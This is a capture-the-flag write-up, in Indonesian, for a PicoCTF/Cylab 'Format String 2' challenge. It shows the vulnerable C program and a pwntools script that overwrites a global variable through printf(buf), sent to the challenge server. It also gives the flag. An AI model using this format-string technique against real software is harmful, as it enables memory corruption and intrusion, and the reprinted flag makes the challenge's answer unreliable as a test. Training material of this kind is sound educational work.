---
slug: "pwn-format-string-2"
title: "Format String 2"
competition: "Cylab Security Academy (PicoCTF)"
category: "Pwn"
difficulty: "Easy"
date: "2026-10-22"
updated: "2026-10-30"
summary: "Format string attack with pwntools automated (elite ball knowledge)"
tags: ["ROP","FORMAT STRING"]
status: "published"
flag: "academy{type_it_manually_if_you_want_but_better_you_do_it_yourself}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-format-string-2"
---

# Format String 2

> Format string attack with pwntools automated (elite ball knowledge)

## Recon

```bash
~/ctf/pwncheatsheet/picoctf/cylab/formatstring2 main*
❯ checksec vuln                                                                 󰥔 08:50:41
[*] '/home/claritys/ctf/pwncheatsheet/picoctf/cylab/formatstring2/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

~/ctf/pwncheatsheet/picoctf/cylab/formatstring2 main*
❯ cat vuln.c                                                                    󰥔 08:51:22
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

## Vulnerability

```jsx
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
```

ada `printf(buf)`, yang di mana dia ada kerentanan format string exploitation. Kita bisa ngirim command format string dari inputan kita seperti `%p`, `%x`, dll.

Kita bisa mengubah value variable `sus` sesuai yang kita inginkanmenggunakan kerentanan tersebut.

## Exploit plan

Sebenarnya challenge ini itu bisa langsung diautomated pakai template, tinggal ganti value aja.

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("vuln_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
context.arch = 'amd64'

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
source /home/claritys/tools/pwndbg/gdbinit.py
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    program = elf.path
    def exec_fmt(payload):
        p = process(program)
        p.sendline(payload)
        return p.recvall()

    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    p = process(program, stderr=PIPE)
    addr = elf.sym['sus']
    log.success(f'sus address {hex(addr)}')
    payload = fmtstr_payload(offset, {addr: 0x67616c66})
    # p.sendline(payload)
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Kita pakai referensi dari docsnya pwntools langsung:

[pwnlib.fmtstr — Format string bug exploitation tools — pwntools 4.15.0 documentation](https://docs.pwntools.com/en/stable/fmtstr.html)

Nah jadi di situ membuat function untuk ngeleak secara otomatis, kita adain `exec_fmt`, terus ada bawaan dari **pwntools** yaitu `FmtStr` untuk menjalanin scriptnya ini. Nah baru ada lagi yaitu `.offset`, dia digabungin dengan variable yang isinya `FmtStr` tadi.

Nah karena si variable `sus` itu adalah target kita dan untungnya dia itu ngga di dalam function tapi langsung diluarnya, dia berarti ditaruh di `.data` Segment. So, dia addressnya itu ngga dinamis kayak variable `buf` dan `flag` yang disimpan distack dan dinamis.

alamat `.data` ini statis dan biasanya berada di kisaran rentang rendah seperti `0x404060`.

Nah lalu ada kemudahan lagi dari **pwntools** ini. Yaitu `fmtstr_payload` yang ngejadiin kita ngga usah mikirin tentang payload, karena ada fungsi bawaan dari **pwntools** ini.

```python
fmstr_payload(<offsetinputkita, {<target>: <maudigantiapa>})
```

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("vuln_patched")

context.binary = elf
context.terminal = ["ghostty", "-e"]
context.arch = 'amd64'

if args.DEBUG:
    context.log_level = "debug"

gdbscript = """
source /home/claritys/tools/pwndbg/gdbinit.py
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("xebec.cylabacademy.net", 46994)

def main():
    r = conn()
    program = elf.path
    def exec_fmt(payload):
        p = process(program)
        p.sendline(payload)
        return p.recvall()

    autofmt = FmtStr(exec_fmt)
    offset = autofmt.offset
    p = process(program, stderr=PIPE)
    addr = elf.sym['sus']
    log.success(f'sus address {hex(addr)}')
    payload = fmtstr_payload(offset, {addr: 0x67616c66})
    # p.sendline(payload)
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

-   Flag
    
    ![image.png](/assets/uploads/605be242-2e5a-468b-8005-ed9b8f195998-image.png)
    
    ## Referensi
    

-   [pwnlib.fmtstr — Format string bug exploitation tools — pwntools 4.15.0 documentation](https://docs.pwntools.com/en/stable/fmtstr.html)
